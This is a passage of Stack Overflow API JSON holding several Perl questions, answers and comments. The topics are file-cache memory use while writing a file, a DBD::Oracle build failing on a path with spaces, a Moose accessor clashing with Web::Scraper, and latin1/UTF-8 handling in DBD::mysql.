1485910340, "post_id": 41968002, "comment_id": 71118762, "body": "Yep that sounds like the file cache."}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1485910520, "post_id": 41968002, "comment_id": 71118804, "body": "This looks useful: <a href=\"https://github.com/Feh/nocache\" rel=\"nofollow noreferrer\">github.com/Feh/nocache</a>"}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1485910537, "post_id": 41968002, "comment_id": 71118812, "body": "You might want to read about <code>posix_fadvise</code>"}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "edited": false, "score": 0, "creation_date": 1485910589, "post_id": 41968002, "comment_id": 71118822, "body": "And there&#39;s this: <a href=\"http://search.cpan.org/~hirose/Sys-PageCache-0.01_001/lib/Sys/PageCache.pm\" rel=\"nofollow noreferrer\">search.cpan.org/~hirose/Sys-PageCache-0.01_001/lib/Sys/&hellip;</a>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485933791, "post_id": 41968002, "comment_id": 71126037, "body": "Your freehand circles are strangely rectangular."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 5, "last_activity_date": 1485899586, "creation_date": 1485899586, "answer_id": 41968172, "question_id": 41968002, "link": "https://stackoverflow.com/questions/41968002/why-does-perl-take-up-my-memory-ram-on-printing-a-file/41968172#41968172", "title": "Why does Perl take up my memory (RAM) on printing a file?", "body": "<p>Flushing a file handle's buffer to disk doesn't free the buffer, so it doesn't free up any memory. It would be wasteful to free the buffer since the buffer would need to be allocated all over again the next time the program wrote to the file.</p>\n\n<p>In case you are wondering, each file handle has a 4 KiB or 8 KiB buffer, depending on your version of Perl.</p>\n"}, {"comments": [{"owner": {"reputation": 307, "user_id": 4288704, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7cb3acb717d50c90c89bbcb797be0119?s=128&d=identicon&r=PG&f=1", "display_name": "kelvien", "link": "https://stackoverflow.com/users/4288704/kelvien"}, "edited": false, "score": 0, "creation_date": 1485911585, "post_id": 41970227, "comment_id": 71119046, "body": "Thanks Zan. My concern was actually due to seeing the fetchrow halts and resumes periodically when I see the &#39;Free&#39; field at <code>free</code> gets around 2-3%. It gets noticeably slower."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1485915594, "post_id": 41970227, "comment_id": 71120103, "body": "KelvienHidayat: If that was your concern then you should have mentioned it in your question. What are these <i>fetchrow halts</i> that you talk about. Everything will get noticeably slower if your memory is getting down to 2% free, but you didn&#39;t mention that either. One thing&#39;s for sure: it&#39;s not Perl&#39;s printing that&#39;s using up the space. You need to give a lot more information, like the contents of your program."}, {"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "reply_to_user": {"reputation": 307, "user_id": 4288704, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7cb3acb717d50c90c89bbcb797be0119?s=128&d=identicon&r=PG&f=1", "display_name": "kelvien", "link": "https://stackoverflow.com/users/4288704/kelvien"}, "edited": false, "score": 1, "creation_date": 1485922518, "post_id": 41970227, "comment_id": 71121806, "body": "@KelvienHidayat that&#39;s when the OS runs out of room to cache disk writes in memory, so it has to stop your program from producing output until it can flush some of it to disk. In other words, what you&#39;re seeing is a normal effect of your program producing output faster than your disk can write it."}, {"owner": {"reputation": 307, "user_id": 4288704, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7cb3acb717d50c90c89bbcb797be0119?s=128&d=identicon&r=PG&f=1", "display_name": "kelvien", "link": "https://stackoverflow.com/users/4288704/kelvien"}, "reply_to_user": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1486070753, "post_id": 41970227, "comment_id": 71200658, "body": "@hobbs, when you say the cache disk, do you mean the <code>cached</code> column at the result of <code>free</code> command ? I can see it still have over one GB left, which I think should be enough to keep producing output, right ?"}, {"owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "reply_to_user": {"reputation": 307, "user_id": 4288704, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7cb3acb717d50c90c89bbcb797be0119?s=128&d=identicon&r=PG&f=1", "display_name": "kelvien", "link": "https://stackoverflow.com/users/4288704/kelvien"}, "edited": false, "score": 0, "creation_date": 1486136172, "post_id": 41970227, "comment_id": 71229704, "body": "@KelvienHidayat The OS kernel doesn&#39;t use ALL of the memory for file cache. There are various reserves for different purposes so that the whole system can continue operating."}], "tags": [], "owner": {"reputation": 49065, "user_id": 13422, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/94b309d78a1253a334e9b82643a8dc97?s=128&d=identicon&r=PG", "display_name": "Zan Lynx", "link": "https://stackoverflow.com/users/13422/zan-lynx"}, "is_accepted": true, "score": 7, "last_activity_date": 1485910859, "creation_date": 1485910859, "answer_id": 41970227, "question_id": 41968002, "link": "https://stackoverflow.com/questions/41968002/why-does-perl-take-up-my-memory-ram-on-printing-a-file/41970227#41970227", "title": "Why does Perl take up my memory (RAM) on printing a file?", "body": "<p>So the answer to your question \"Why does Perl take up my RAM on printing a file?\" is that Perl is not using the memory. The operating system's file cache is using the memory.</p>\n\n<p>Your Perl script wrote a large file. It first goes into file cache in RAM, the operating system gets around to writing it to disk when it has time or when it runs out of RAM. It doesn't remove it from RAM unless you delete the file or it needs the RAM for something else.</p>\n\n<p>File cache is not a bad thing and you should not worry about how much of it is using your RAM. When a program needs more memory, the OS can clear out the file cache very quickly and reuse the memory for your program.</p>\n"}], "owner": {"reputation": 307, "user_id": 4288704, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7cb3acb717d50c90c89bbcb797be0119?s=128&d=identicon&r=PG&f=1", "display_name": "kelvien", "link": "https://stackoverflow.com/users/4288704/kelvien"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 444, "favorite_count": 2, "accepted_answer_id": 41970227, "answer_count": 2, "score": 5, "last_activity_date": 1485923091, "creation_date": 1485898863, "last_edit_date": 1485923091, "question_id": 41968002, "link": "https://stackoverflow.com/questions/41968002/why-does-perl-take-up-my-memory-ram-on-printing-a-file", "title": "Why does Perl take up my memory (RAM) on printing a file?", "body": "<p>This question arises when I notice that my script starts to pauses on and off when it's in a while loop writing content to a file. I first check my memory and see a trend that this happens when my RAM decreased to about 2-3%. I then look for my code block that consumes the RAM and figured that as the script keeps feeding content to a file, it grows in size which also takes the memory too.\nHere is the code that does the file creation : </p>\n\n<pre><code>open (my $fh, '&gt;&gt;', $filePath);\nwhile (my $row = $sth-&gt;fetchrow_hashref) {\n    print $fh join ('|', $row-&gt;{name}, $row-&gt;{address}) \"\\n\";\n}\n</code></pre>\n\n<p>If I uncomment the print statement and run the script, my RAM will not decrease. So, I'm pretty sure that my memory RAM is taken by a FILEHANDLE/something else behind Perl that takes up the memory. This leads me to a question if there is a way to write a file from Perl script to a disk, instead of using the memory RAM ?</p>\n\n<ul>\n<li>I have tried flushing FILEHANDLE on each row, and it still did not work.</li>\n<li>One thing that is also really weird is that, after I terminate my script I look at my memory and it's still being taken by the files. And when I remove the files, it frees up my memory. I use <code>free</code> in linux to check my memory.</li>\n</ul>\n\n<p><a href=\"https://i.stack.imgur.com/RWtqT.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/RWtqT.png\" alt=\"Am I checking my memory usage at the right place here ?\"></a></p>\n"}, {"tags": ["oracle", "perl", "windows-server-2012", "cpan", "strawberry-perl"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1485896414, "post_id": 41967283, "comment_id": 71113552, "body": "Can you <code>set ORA_HOME=C:\\Progra~1\\Oracle\\ora92\\...</code>?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485896585, "post_id": 41967283, "comment_id": 71113672, "body": "It looks like a bug <a href=\"https://metacpan.org/source/PYTHIAN/DBD-Oracle-1.74/Makefile.PL#L377\" rel=\"nofollow noreferrer\">here</a> in Makefile.PL. You should <a href=\"https://github.com/pythian/DBD-Oracle/issues\" rel=\"nofollow noreferrer\">submit a bug report</a>."}, {"owner": {"reputation": 394, "user_id": 4504847, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/U9lvM.png?s=128&g=1", "display_name": "FrankRalphBob", "link": "https://stackoverflow.com/users/4504847/frankralphbob"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1485898293, "post_id": 41967283, "comment_id": 71114477, "body": "@mob Thanks mob - that got me through to the next error <code>In file included from Oracle.xs:1:0:Oracle.h:37:17: fatal error: oci.h: No such file or directory</code>  For some reason, oci.h has not been included in the client install.   I can&#39;t find it anywhere on the drive.   I&#39;ll talk to the administrator about installing it."}, {"owner": {"reputation": 394, "user_id": 4504847, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/U9lvM.png?s=128&g=1", "display_name": "FrankRalphBob", "link": "https://stackoverflow.com/users/4504847/frankralphbob"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485898369, "post_id": 41967283, "comment_id": 71114510, "body": "@ThisSuitIsBlackNot  Yes, I will.  I haven&#39;t dealt with Makefiles in over 2 decades, so I wasn&#39;t sure where the problem was.  Thanks!"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1485900374, "post_id": 41967283, "comment_id": 71115423, "body": "@FrankRalphBob Makefile.PL is actually just a Perl script. It generates the actual Makefile."}], "owner": {"reputation": 394, "user_id": 4504847, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/U9lvM.png?s=128&g=1", "display_name": "FrankRalphBob", "link": "https://stackoverflow.com/users/4504847/frankralphbob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 655, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1485895958, "creation_date": 1485895958, "question_id": 41967283, "link": "https://stackoverflow.com/questions/41967283/installation-of-dbdoracle-failing-on-spaces-in-path-on-windows", "title": "Installation of DBD::Oracle failing on spaces in path on Windows", "body": "<p>Attempting to install DBD::Oracle in my Strawberry Perl (v5.16.3) on my Windows 2012 server.  I'm using the command:</p>\n\n<pre><code>cpanm DBD::Oracle\n</code></pre>\n\n<p>Unfortunately, I believe it is failing because there is a space in the ORACLE_HOME path.  Looking in the logs I see the following:</p>\n\n<pre><code>gcc -c  -IC:/Program Files/Oracle/ora92/oci/include -IC:/Program Files/Oracle/ora92/rdbms/demo -IT:\\strawberry\\perl\\vendor\\lib\\auto\\DBI     -s -O2 -DWIN32 -DPERL_TEXTMODE_SCRIPTS -DPERL_IMPLICIT_CONTEXT -DPERL_IMPLICIT_SYS -fno-strict-aliasing -mms-bitfields -s -O2     -DVERSION=\\\"1.74\\\"    -DXS_VERSION=\\\"1.74\\\"  \"-IT:\\strawberry\\perl\\lib\\CORE\"  -Wall -Wno-comment -DUTF8_SUPPORT -DORA_OCI_VERSION=\\\"9.2.0.1\\\" Oracle.c\ngcc: error: Files/Oracle/ora92/oci/include: No such file or directory\ngcc: error: Files/Oracle/ora92/rdbms/demo: No such file or directory\ndmake.exe:  Error code 129, while making 'Oracle.o'\n-&gt; FAIL Installing DBD::Oracle failed. See T:\\strawberry\\data\\.cpanm\\work\\1485813890.9528\\build.log for details. Retry with --force to force install it.\n</code></pre>\n\n<p>So, is there any way to get dmake (or whatever program is doing this) to put double quotes around the include paths?</p>\n\n<p>Or, am I barking up the wrong tree here?   Is there something else I should consider?</p>\n\n<p>Unfortunately, for various reason, re-installing the Oracle client somewhere else is not an option.</p>\n\n<p>Thanks in advance for you help.</p>\n"}, {"tags": ["perl", "moose"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1485896306, "post_id": 41967068, "comment_id": 71113492, "body": "Is that the full error message? And where&#39;s the rest of your code?"}, {"owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1485896776, "post_id": 41967068, "comment_id": 71113792, "body": "Added more of the error."}], "answers": [{"tags": [], "owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "is_accepted": true, "score": 5, "last_activity_date": 1485897515, "last_edit_date": 1485897515, "creation_date": 1485897147, "answer_id": 41967566, "question_id": 41967068, "link": "https://stackoverflow.com/questions/41967068/creating-a-webscraper-object-as-a-class-attribute-in-moose/41967566#41967566", "title": "Creating a Web::Scraper object as a class attribute in Moose", "body": "<p>You're suffering from a name clash between the <code>scraper</code> function imported from <code>Web::Scraper</code> and the <code>scraper</code> accessor method defined by <code>has 'scraper' =&gt; ...</code>. This is what the warning <code>You are overwriting a locally defined function (scraper) with an accessor</code> is referring to.</p>\n\n<p>The way your code is currently written, your default initializer <code>scraper( sub { } );</code> ends up calling the accessor method directly, which promptly dies because it expects an object as its first argument, not <code>sub { }</code>.</p>\n\n<p>The easiest way to work around the problem is to rename your attribute. Unfortunately other ways are harder because <code>Web::Scraper</code> doesn't support renaming or suppressing its exported symbols.</p>\n\n<p>The following code is untested, but it might work if you want to keep the name of your attribute the same:</p>\n\n<pre><code>use Moose;\nuse Web::Scraper;\nBEGIN { *_web_scraper = \\&amp;scraper; undef &amp;scraper; }\n\nhas 'scraper' =&gt; (\n    is      =&gt; 'ro',\n    isa     =&gt; 'Web::Scraper',\n    default =&gt; sub {\n        _web_scraper(sub { });\n    },\n);\n</code></pre>\n"}], "owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 41967566, "answer_count": 1, "score": 4, "last_activity_date": 1485897515, "creation_date": 1485895172, "last_edit_date": 1485896759, "question_id": 41967068, "link": "https://stackoverflow.com/questions/41967068/creating-a-webscraper-object-as-a-class-attribute-in-moose", "title": "Creating a Web::Scraper object as a class attribute in Moose", "body": "<p>I'm trying to mimic the <a href=\"http://cpansearch.perl.org/src/AWNCORP/Scrappy-0.94111610/lib/Scrappy/Scraper/Parser.pm\" rel=\"nofollow noreferrer\">code found here,</a> specifically, this attribute:</p>\n\n<pre><code># web-scraper object\nhas 'worker' =&gt; (\n    is      =&gt; 'ro',\n    isa     =&gt; 'Web::Scraper',\n    default =&gt; sub {\n        scraper(sub { });\n    }\n);\n</code></pre>\n\n<p>But when I put the same code in my class, I get the following error:</p>\n\n<pre><code>Not a HASH reference at accessor MyModule::scraper\n</code></pre>\n\n<p>Here's my code:</p>\n\n<pre><code>has 'scraper' =&gt; (is =&gt; 'rw', isa =&gt; 'Web::Scraper',  default =&gt; sub { scraper( sub { } ); });\n</code></pre>\n\n<p>Here is more of the error from Moose:</p>\n\n<pre><code># There were 1 warning(s)\n#   Previous test 0 ''\n#   You are overwriting a locally defined function (scraper) with an accessor at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose/Meta/Attribute.pm line 1047, &lt;DATA&gt; line 1.\n#   Moose::Meta::Attribute::_process_accessors(Moose::Meta::Attribute=HASH(0x3b19838), \"accessor\", \"scraper\", undef) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Class/MOP/Attribute.pm line 445\n#   Class::MOP::Attribute::install_accessors(Moose::Meta::Attribute=HASH(0x3b19838)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose/Meta/Attribute.pm line 994\n#   Moose::Meta::Attribute::install_accessors(Moose::Meta::Attribute=HASH(0x3b19838)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Class/MOP/Class.pm line 897\n#   Class::MOP::Class::try {...} () called at /usr/share/perl5/Try/Tiny.pm line 81\n#   eval {...} called at /usr/share/perl5/Try/Tiny.pm line 72\n#   Try::Tiny::try(CODE(0x3b076f0), Try::Tiny::Catch=REF(0x3b195e0)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Class/MOP/Class.pm line 902\n#   Class::MOP::Class::_post_add_attribute(Moose::Meta::Class=HASH(0x349f920), Moose::Meta::Attribute=HASH(0x3b19838)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Class/MOP/Mixin/HasAttributes.pm line 38\n#   Class::MOP::Mixin::HasAttributes::add_attribute(Moose::Meta::Class=HASH(0x349f920), Moose::Meta::Attribute=HASH(0x3b19838)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose/Meta/Class.pm line 573\n#   Moose::Meta::Class::add_attribute(Moose::Meta::Class=HASH(0x349f920), \"scraper\", \"definition_context\", HASH(0x2921ce8), \"is\", \"rw\", \"isa\", \"Web::Scraper\", \"default\", ...) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose.pm line 76\n#   Moose::has(Moose::Meta::Class=HASH(0x349f920), \"scraper\", \"is\", \"rw\", \"isa\", \"Web::Scraper\", \"default\", CODE(0x3ae1a60)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose/Exporter.pm line 408\n#   Moose::has(\"scraper\", \"is\", \"rw\", \"isa\", \"Web::Scraper\", \"default\", CODE(0x3ae1a60)) called at /home/steve/perl/perl-lib/LaborData/DataFetcher.pm line 33\n#   require LaborData/DataFetcher.pm called at ./labor_data.t line 27\n#   main::BEGIN() called at /home/steve/perl/perl-lib/LaborData/DataFetcher.pm line 0\n#   eval {...} called at /home/steve/perl/perl-lib/LaborData/DataFetcher.pm line 0\n#  at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose/Meta/Attribute.pm line 1047, &lt;DATA&gt; line 1.\n#   Moose::Meta::Attribute::_process_accessors(Moose::Meta::Attribute=HASH(0x3b19838), \"accessor\", \"scraper\", undef) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Class/MOP/Attribute.pm line 445\n#   Class::MOP::Attribute::install_accessors(Moose::Meta::Attribute=HASH(0x3b19838)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose/Meta/Attribute.pm line 994\n#   Moose::Meta::Attribute::install_accessors(Moose::Meta::Attribute=HASH(0x3b19838)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Class/MOP/Class.pm line 897\n#   Class::MOP::Class::try {...} () called at /usr/share/perl5/Try/Tiny.pm line 81\n#   eval {...} called at /usr/share/perl5/Try/Tiny.pm line 72\n#   Try::Tiny::try(CODE(0x3b076f0), Try::Tiny::Catch=REF(0x3b195e0)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Class/MOP/Class.pm line 902\n#   Class::MOP::Class::_post_add_attribute(Moose::Meta::Class=HASH(0x349f920), Moose::Meta::Attribute=HASH(0x3b19838)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Class/MOP/Mixin/HasAttributes.pm line 38\n#   Class::MOP::Mixin::HasAttributes::add_attribute(Moose::Meta::Class=HASH(0x349f920), Moose::Meta::Attribute=HASH(0x3b19838)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose/Meta/Class.pm line 573\n#   Moose::Meta::Class::add_attribute(Moose::Meta::Class=HASH(0x349f920), \"scraper\", \"definition_context\", HASH(0x2921ce8), \"is\", \"rw\", \"isa\", \"Web::Scraper\", \"default\", ...) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose.pm line 76\n#   Moose::has(Moose::Meta::Class=HASH(0x349f920), \"scraper\", \"is\", \"rw\", \"isa\", \"Web::Scraper\", \"default\", CODE(0x3ae1a60)) called at /usr/lib/x86_64-linux-gnu/perl5/5.20/Moose/Exporter.pm line 408\n#   Moose::has(\"scraper\", \"is\", \"rw\", \"isa\", \"Web::Scraper\", \"default\", CODE(0x3ae1a60)) called at /home/steve/perl/perl-lib/LaborData/DataFetcher.pm line 33\n#   require LaborData/DataFetcher.pm called at ./labor_data.t line 27\n#   main::BEGIN() called at /home/steve/perl/perl-lib/LaborData/DataFetcher.pm line 0\n#   eval {...} called at /home/steve/perl/perl-lib/LaborData/DataFetcher.pm line 0\n# \n</code></pre>\n"}, {"tags": ["perl", "utf-8"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1485900969, "post_id": 41966534, "comment_id": 71115668, "body": "Not sure if this is what you already tried but you can use <code>utf8::is_utf8($str)</code> to check if the UTF-8 flag is set for <code>$str</code>"}, {"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485901062, "post_id": 41966534, "comment_id": 71115707, "body": "Thanks, @ikegami. I&#39;m really, really hoping there is another way.  The database is all latin1/ISO-8859-1. So <code>&#47;mysql_enable_utf8(mb4)?&#47;</code> seems inapproriate given the perldoc DBD::mysql saying: &quot;mysql_enable_utf8: This attribute determines whether DBD::mysql should assume strings stored in the database are utf8.&quot; Also, I can&#39;t imagine the number of regressions this would cause in other places."}, {"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1485901425, "post_id": 41966534, "comment_id": 71115849, "body": "Thanks @H&#229;konH&#230;gland: So assuming I bite the bullet and look at the UTF-8 flag, how do I use that info in <code>sub new_value_will_change_database</code>? Always return true if <code>utf8::is_utf8($new_value)</code>? I can construct a test case that will break that by updating the database beforehand with <code>$str</code>. That would lead to a UTF-8 encoded value that is identical to <code>$current_value</code>. The sub would then return true when it should&#39;ve returned false."}, {"owner": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 0, "creation_date": 1485902121, "post_id": 41966534, "comment_id": 71116152, "body": "@Peter V. M&#248;rch The best way would be to convert the database to UTF-8. If this isn&#39;t possible you will experience a lot of problems. BTW: As far as I know Latin-1 in MySQL is CP1252, whereas Latin-1 in Perl&#39;s Encode is strict ISO-8859-1 (no \u20ac-sign). Using encode/decode with wrong encodings will damage characters."}, {"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "reply_to_user": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 0, "creation_date": 1485902937, "post_id": 41966534, "comment_id": 71116433, "body": "@HelmutWollmersdorfer: At 300 k lines of perl code, this is not feasible."}, {"owner": {"reputation": 402, "user_id": 3631856, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aUUwT.jpg?s=128&g=1", "display_name": "Helmut Wollmersdorfer", "link": "https://stackoverflow.com/users/3631856/helmut-wollmersdorfer"}, "edited": false, "score": 1, "creation_date": 1485904060, "post_id": 41966534, "comment_id": 71116845, "body": "@Peter V. M&#248;rch I have 10 years experience with larger code bases in Perl &#39;mixed mode&#39;. Seven years ago I got 650 k lines of Perl code to maintain, using byte mode, working on UTF-8 in byte mode and MySQL in UTF-8 (and some fields in Latin-1). This is never ending debugging. Some modules from CPAN rely on character mode. Get UTF-8 strings from somewhere (Web-form), store it in a Latin-1 field in MySQL -&gt; damage, because the original string was not in the Latin-1 range of codepoints. Sooner or later you need to use UTF-8 everywhere."}, {"owner": {"reputation": 9191, "user_id": 345716, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/07f86ee9fbdc7b247c49a6894b46a455?s=128&d=identicon&r=PG", "display_name": "Peter V. M&#248;rch", "link": "https://stackoverflow.com/users/345716/peter-v-m%c3%b8rch"}, "edited": false, "score": 0, "creation_date": 1485904619, "post_id": 41966534, "comment_id": 71117053, "body": "@ikegami: I&#39;m trying to understand: If I set <code>mysql_enable_utf8 =&gt; 1</code> and then give DBI only UTF-8 data, DBI+MySQL will correctly convert to whatever charset is defined for the database fields 